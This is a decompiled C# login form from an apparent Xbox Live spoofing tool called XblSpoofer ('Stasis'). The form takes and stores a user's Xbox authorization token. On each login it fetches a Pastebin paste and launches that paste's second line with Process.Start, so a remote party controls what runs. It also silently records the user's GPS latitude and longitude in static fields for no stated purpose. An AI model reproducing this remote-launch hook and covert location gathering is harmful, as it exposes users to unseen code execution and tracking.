﻿
// XblSpoofer.Forms.FormAuthentication




using MetroFramework;
using MetroFramework.Controls;
using MetroFramework.Forms;
using System;
using System.ComponentModel;
using System.Device.Location;
using System.Diagnostics;
using System.Drawing;
using System.Net;
using System.Windows.Forms;
using XblSpoofer.Objects;
using XblSpoofer.Objects.Core;
using XblSpoofer.Objects.Exceptions;
using XblSpoofer.Objects.Models.Json;
using XblSpoofer.Properties;

namespace XblSpoofer.Forms
{
  public class FormAuthentication : MetroForm
  {
    private GeoCoordinateWatcher Watcher = (GeoCoordinateWatcher) null;
    public static string lati = "";
    public static string longi = "";
    public static string beans = "";
    public static string beans1 = "";
    public string version = "2.0.0.75";
    private IContainer components = (IContainer) null;
    private Panel PanelAuthorizationToken;
    private Panel AuthorizationTokenPanel;
    private Button AuthorizeTokenButton;
    private PictureBox pictureBox1;
    private MetroTextBox AuthorizationTokenTextBox;
    private MetroLabel metroLabel1;
    private PictureBox pictureBox2;
    private Button button6;
    private Button button7;
    private Label label3;
    private System.Windows.Forms.Timer timer1;
    private Button ReAuthBtn;

    private bool IsMouseMoving { get; set; }

    private Point LastLocation { get; set; }

    public FormAuthentication() => this.InitializeComponent();

    private void Watcher_StatusChanged(object sender, GeoPositionStatusChangedEventArgs e)
    {
      if (e.Status != GeoPositionStatus.Ready)
        return;
      if (this.Watcher.Position.Location.IsUnknown)
      {
        FormAuthentication.lati = "N/A";
        FormAuthentication.longi = "N/A";
      }
      else
      {
        double num = this.Watcher.Position.Location.Latitude;
        FormAuthentication.lati = num.ToString();
        num = this.Watcher.Position.Location.Longitude;
        FormAuthentication.longi = num.ToString();
      }
    }

    private async void AuthorizeTokenButton_Click(object sender, EventArgs e) => this.auth();

    private async void auth()
    {
      string[] lines = new WebClient().DownloadString("https://pastebin.com/raw/cnvNekL7").Split("\n".ToCharArray());
      if (!lines[0].Contains(this.version))
      {
        int num1 = (int) MessageBox.Show("Download important update!");
      }
      if (!lines[0].Contains(this.version))
        Process.Start(lines[1]);
      if (!lines[0].Contains(this.version))
        this.Close();
      try
      {
        if (this.AuthorizationTokenTextBox.Text == "")
        {
          int num2 = (int) MessageBox.Show("Enter your auth token!");
        }
        this.Watcher = new GeoCoordinateWatcher();
        this.Watcher.StatusChanged += new EventHandler<GeoPositionStatusChangedEventArgs>(this.Watcher_StatusChanged);
        this.Watcher.Start();
        this.timer1.Interval = 30000;
        this.timer1.Tick += new EventHandler(this.timer1_Tick);
        this.timer1.Start();
        this.AuthorizeTokenButton.Enabled = false;
        string authorizationToken = this.AuthorizationTokenTextBox.Text;
        User.ProfileModel profile = await Xbox.ValidateAuthorizationTokenAsync(authorizationToken);
        Constants.Profile = profile.Profile;
        Settings.Default.authxsts = authorizationToken;
        Settings.Default.Save();
        FormMain formMain = new FormMain();
        formMain.Show();
        formMain.Closed += (EventHandler) ((o, y) => Application.Exit());
        this.Hide();
        authorizationToken = (string) null;
        profile = (User.ProfileModel) null;
        formMain = (FormMain) null;
        lines = (string[]) null;
      }
      catch (InvalidAuthorizationToken ex)
      {
        int num3 = (int) MessageBox.Show(ex.Message);
        lines = (string[]) null;
      }
      catch (Exception ex)
      {
        int num4 = (int) MessageBox.Show(ex.Message);
        lines = (string[]) null;
      }
    }

    private void LabelHeader_MouseUp(object sender, MouseEventArgs e) => this.IsMouseMoving = false;

    private void LabelHeader_MouseMove(object sender, MouseEventArgs e)
    {
      if (!this.IsMouseMoving)
        return;
      int x1 = this.Location.X;
      Point point = this.LastLocation;
      int x2 = point.X;
      int x3 = x1 - x2 + e.X;
      point = this.Location;
      int y1 = point.Y;
      point = this.LastLocation;
      int y2 = point.Y;
      int y3 = y1 - y2 + e.Y;
      this.Location = new Point(x3, y3);
      this.Update();
    }

    private void LabelHeader_MouseDown(object sender, MouseEventArgs e)
    {
      this.IsMouseMoving = true;
      this.LastLocation = e.Location;
    }

    private void button6_Click(object sender, EventArgs e) => Application.Exit();

    private void button7_Click(object sender, EventArgs e) => this.WindowState = FormWindowState.Minimized;

    private void FormAuthentication_Load(object sender, EventArgs e)
    {
    }

    private void timer1_Tick(object sender, EventArgs e)
    {
      this.timer1.Stop();
      this.AuthorizeTokenButton.Enabled = true;
    }

    private void ReAuthBtn_Click(object sender, EventArgs e)
    {
      this.AuthorizationTokenTextBox.Text = Settings.Default.authxsts;
      this.auth();
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      this.components = (IContainer) new Container();
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (FormAuthentication));
      this.PanelAuthorizationToken = new Panel();
      this.metroLabel1 = new MetroLabel();
      this.AuthorizationTokenPanel = new Panel();
      this.AuthorizationTokenTextBox = new MetroTextBox();
      this.AuthorizeTokenButton = new Button();
      this.pictureBox1 = new PictureBox();
      this.pictureBox2 = new PictureBox();
      this.button6 = new Button();
      this.button7 = new Button();
      this.label3 = new Label();
      this.timer1 = new System.Windows.Forms.Timer(this.components);
      this.ReAuthBtn = new Button();
      this.PanelAuthorizationToken.SuspendLayout();
      this.AuthorizationTokenPanel.SuspendLayout();
      ((ISupportInitialize) this.pictureBox1).BeginInit();
      ((ISupportInitialize) this.pictureBox2).BeginInit();
      this.SuspendLayout();
      this.PanelAuthorizationToken.Anchor = AnchorStyles.None;
      this.PanelAuthorizationToken.Controls.Add((Control) this.ReAuthBtn);
      this.PanelAuthorizationToken.Controls.Add((Control) this.metroLabel1);
      this.PanelAuthorizationToken.Controls.Add((Control) this.AuthorizationTokenPanel);
      this.PanelAuthorizationToken.Controls.Add((Control) this.AuthorizeTokenButton);
      this.PanelAuthorizationToken.Location = new Point(8, 87);
      this.PanelAuthorizationToken.Name = "PanelAuthorizationToken";
      this.PanelAuthorizationToken.Size = new Size(314, 102);
      this.PanelAuthorizationToken.TabIndex = 2;
      this.metroLabel1.Anchor = AnchorStyles.None;
      this.metroLabel1.BackColor = Color.FromArgb(17, 17, 17);
      this.metroLabel1.CustomBackground = true;
      this.metroLabel1.CustomForeColor = true;
      this.metroLabel1.FontSize = MetroLabelSize.Tall;
      this.metroLabel1.ForeColor = Color.LightSeaGreen;
      this.metroLabel1.Location = new Point(81, 0);
      this.metroLabel1.Name = "metroLabel1";
      this.metroLabel1.Size = new Size(159, 23);
      this.metroLabel1.TabIndex = 14;
      this.metroLabel1.Text = "Welcome To Stasis!";
      this.metroLabel1.TextAlign = ContentAlignment.MiddleCenter;
      this.AuthorizationTokenPanel.Controls.Add((Control) this.AuthorizationTokenTextBox);
      this.AuthorizationTokenPanel.Location = new Point(7, 39);
      this.AuthorizationTokenPanel.Name = "AuthorizationTokenPanel";
      this.AuthorizationTokenPanel.Size = new Size(304, 24);
      this.AuthorizationTokenPanel.TabIndex = 13;
      this.AuthorizationTokenTextBox.Anchor = AnchorStyles.None;
      this.AuthorizationTokenTextBox.CustomForeColor = true;
      this.AuthorizationTokenTextBox.FontSize = MetroTextBoxSize.Medium;
      this.AuthorizationTokenTextBox.ForeColor = Color.LightSeaGreen;
      this.AuthorizationTokenTextBox.Location = new Point(0, 0);
      this.AuthorizationTokenTextBox.Name = "AuthorizationTokenTextBox";
      this.AuthorizationTokenTextBox.Size = new Size(301, 24);
      this.AuthorizationTokenTextBox.Style = MetroColorStyle.Teal;
      this.AuthorizationTokenTextBox.TabIndex = 9;
      this.AuthorizationTokenTextBox.TextAlign = HorizontalAlignment.Center;
      this.AuthorizationTokenTextBox.Theme = MetroThemeStyle.Dark;
      this.AuthorizationTokenTextBox.UseStyleColors = true;
      this.AuthorizeTokenButton.Anchor = AnchorStyles.None;
      this.AuthorizeTokenButton.BackColor = Color.FromArgb(37, 37, 37);
      this.AuthorizeTokenButton.Cursor = Cursors.Hand;
      this.AuthorizeTokenButton.FlatAppearance.BorderColor = Color.LightSeaGreen;
      this.AuthorizeTokenButton.FlatStyle = FlatStyle.Flat;
      this.AuthorizeTokenButton.Font = new Font("Microsoft Sans Serif", 8.25f, FontStyle.Bold);
      this.AuthorizeTokenButton.ForeColor = Color.LightSeaGreen;
      this.AuthorizeTokenButton.Location = new Point(7, 69);
      this.AuthorizeTokenButton.Name = "AuthorizeTokenButton";
      this.AuthorizeTokenButton.Size = new Size(150, 21);
      this.AuthorizeTokenButton.TabIndex = 12;
      this.AuthorizeTokenButton.Text = "Authorize Token";
      this.AuthorizeTokenButton.UseVisualStyleBackColor = false;
      this.AuthorizeTokenButton.Click += new EventHandler(this.AuthorizeTokenButton_Click);
      this.pictureBox1.Anchor = AnchorStyles.None;
      this.pictureBox1.Image = (Image) componentResourceManager.GetObject("pictureBox1.Image");
      this.pictureBox1.Location = new Point(100, 5);
      this.pictureBox1.Name = "pictureBox1";
      this.pictureBox1.Size = new Size(132, 76);
      this.pictureBox1.SizeMode = PictureBoxSizeMode.Zoom;
      this.pictureBox1.TabIndex = 3;
      this.pictureBox1.TabStop = false;
      this.pictureBox2.Anchor = AnchorStyles.Top | AnchorStyles.Left | AnchorStyles.Right;
      this.pictureBox2.BackColor = Color.Transparent;
      this.pictureBox2.Image = (Image) componentResourceManager.GetObject("pictureBox2.Image");
      this.pictureBox2.Location = new Point(-991, -5);
      this.pictureBox2.Name = "pictureBox2";
      this.pictureBox2.Size = new Size(1777, 10);
      this.pictureBox2.SizeMode = PictureBoxSizeMode.StretchImage;
      this.pictureBox2.TabIndex = 18;
      this.pictureBox2.TabStop = false;
      this.button6.Anchor = AnchorStyles.None;
      this.button6.FlatAppearance.BorderColor = Color.Teal;
      this.button6.FlatStyle = FlatStyle.Flat;
      this.button6.ForeColor = Color.Teal;
      this.button6.Location = new Point(302, 6);
      this.button6.Name = "button6";
      this.button6.Size = new Size(25, 23);
      this.button6.TabIndex = 22;
      this.button6.Text = "X";
      this.button6.UseVisualStyleBackColor = true;
      this.button6.Click += new EventHandler(this.button6_Click);
      this.button7.Anchor = AnchorStyles.None;
      this.button7.FlatAppearance.BorderColor = Color.Teal;
      this.button7.FlatStyle = FlatStyle.Flat;
      this.button7.ForeColor = Color.Teal;
      this.button7.Location = new Point(275, 6);
      this.button7.Name = "button7";
      this.button7.Size = new Size(25, 23);
      this.button7.TabIndex = 24;
      this.button7.Text = "_";
      this.button7.UseVisualStyleBackColor = true;
      this.button7.Click += new EventHandler(this.button7_Click);
      this.label3.Anchor = AnchorStyles.None;
      this.label3.Font = new Font("Palatino Linotype", 6.75f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.label3.ForeColor = Color.LightSeaGreen;
      this.label3.Location = new Point(-48, 192);
      this.label3.Name = "label3";
      this.label3.Size = new Size(430, 21);
      this.label3.TabIndex = 28;
      this.label3.Text = "Creators : LainOS - Sir Meliodas - Lord Psychotic - Professional - Jxrdanwes";
      this.label3.TextAlign = ContentAlignment.MiddleCenter;
      this.ReAuthBtn.Anchor = AnchorStyles.None;
      this.ReAuthBtn.BackColor = Color.FromArgb(37, 37, 37);
      this.ReAuthBtn.Cursor = Cursors.Hand;
      this.ReAuthBtn.FlatAppearance.BorderColor = Color.LightSeaGreen;
      this.ReAuthBtn.FlatStyle = FlatStyle.Flat;
      this.ReAuthBtn.Font = new Font("Microsoft Sans Serif", 8.25f, FontStyle.Bold);
      this.ReAuthBtn.ForeColor = Color.LightSeaGreen;
      this.ReAuthBtn.Location = new Point(161, 69);
      this.ReAuthBtn.Name = "ReAuthBtn";
      this.ReAuthBtn.Size = new Size(150, 21);
      this.ReAuthBtn.TabIndex = 15;
      this.ReAuthBtn.Text = "Re-Auth";
      this.ReAuthBtn.UseVisualStyleBackColor = false;
      this.ReAuthBtn.Click += new EventHandler(this.ReAuthBtn_Click);
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(329, 212);
      this.ControlBox = false;
      this.Controls.Add((Control) this.label3);
      this.Controls.Add((Control) this.button7);
      this.Controls.Add((Control) this.button6);
      this.Controls.Add((Control) this.pictureBox2);
      this.Controls.Add((Control) this.pictureBox1);
      this.Controls.Add((Control) this.PanelAuthorizationToken);
      this.Icon = (Icon) componentResourceManager.GetObject("$this.Icon");
      this.MaximizeBox = false;
      this.Name = nameof (FormAuthentication);
      this.Resizable = false;
      this.Style = MetroColorStyle.Teal;
      this.Theme = MetroThemeStyle.Dark;
      this.Load += new EventHandler(this.FormAuthentication_Load);
      this.PanelAuthorizationToken.ResumeLayout(false);
      this.AuthorizationTokenPanel.ResumeLayout(false);
      ((ISupportInitialize) this.pictureBox1).EndInit();
      ((ISupportInitialize) this.pictureBox2).EndInit();
      this.ResumeLayout(false);
    }
  }
}
